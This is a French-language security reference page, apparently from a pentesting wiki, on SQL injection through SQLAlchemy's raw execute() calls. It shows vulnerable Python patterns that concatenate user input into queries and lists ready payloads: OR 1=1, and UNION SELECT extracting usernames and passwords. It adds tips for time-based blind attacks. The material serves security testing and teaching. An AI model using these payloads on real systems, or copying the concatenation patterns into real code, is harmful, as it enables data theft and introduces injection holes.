---
title: "Injection SQL brute SQLAlchemy : execute() et instructions construites par chaîne"
description: Passer des chaînes concaténées à Connection/Session.execute() ou Engine.execute() contourne les paramètres bindés de SQLAlchemy et produit une injection SQL.
keywords:
  - SQLAlchemy
  - injection SQL brute
  - execute()
  - engine.execute
  - ORM Python
  - injection SQL
---

# Injection SQL brute

Les couches Core et ORM de SQLAlchemy paramètrent les requêtes construites avec leur langage d'expression, mais les applications descendent fréquemment au SQL brut via `connection.execute()`, `engine.execute()` ou `session.execute()`. Lorsque la chaîne de l'instruction est concaténée ou formatée par f-string avec une entrée utilisateur, SQLAlchemy l'envoie telle quelle et le point d'entrée est une injection SQL.

## Schémas vulnérables

```python
# name from the request
conn.execute("SELECT * FROM users WHERE name = '" + name + "'")
engine.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

Les versions modernes de SQLAlchemy exigent une clause `text()` pour le SQL brut (voir [Injection Text()](text-injection.md)), mais la même erreur de concaténation à l'intérieur de `text()` est tout aussi injectable. La forme sûre lie les paramètres (`text("... = :name")` avec `{"name": name}`).

## Exploitation

Exploitez comme une injection ordinaire dans le contexte de la valeur. `id` numérique :

```
1 OR 1=1
0 UNION SELECT id, username, password FROM users
```

`name` entre guillemets :

```
' OR '1'='1
' UNION SELECT username, password, NULL FROM users --
```

SQLAlchemy tourne sur PostgreSQL, MySQL, SQLite, Oracle et SQL Server, adaptez donc le dialecte : commentaires `--`/`#`, `pg_sleep()`/`SLEEP()` pour le blind temporel, et fonctions de chaînes spécifiques au backend pour l'extraction de sous-chaînes. Le pilote DBAPI n'autorise généralement qu'une instruction par `execute()`, privilégiez donc `UNION` et l'inférence plutôt que les requêtes empilées, sauf si le pilote est configuré autrement (par exemple `psycopg2` avec plusieurs instructions).

## Outils

- **sqlmap** : automatisation de l'extraction contre les points d'entrée execute() et engine.execute().
- **Burp Repeater et Intruder** : diffusion de payloads UNION et blind spécifiques au dialecte.

## Références

- [Documentation SQLAlchemy : Working with raw SQL (text())](https://docs.sqlalchemy.org/en/20/core/connections.html#using-textual-sql)
- [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
